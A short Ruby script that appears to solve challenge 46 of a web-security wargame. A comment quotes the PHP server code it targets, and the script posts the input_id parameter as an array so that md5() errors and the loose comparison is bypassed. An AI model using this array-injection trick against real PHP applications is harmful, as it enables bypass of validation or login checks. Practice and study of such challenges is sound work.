# encoding: utf-8
require_relative 'hack_utils'
require 'logger'

=begin
// server side code
<?php
  @error_reporting(0);
  $ans=$_POST['input_id'];
  if(substr(md5($ans),0,10)=="0"){
    print "OK";
  }else{
    print "NG";
  }
?>
=end
RestClient.log = Logger.new($stderr)
# post input_id param as a array, then raise error in md5() function
HackUtils.post_answer(46, {:input_id => [0,1,2,3]})
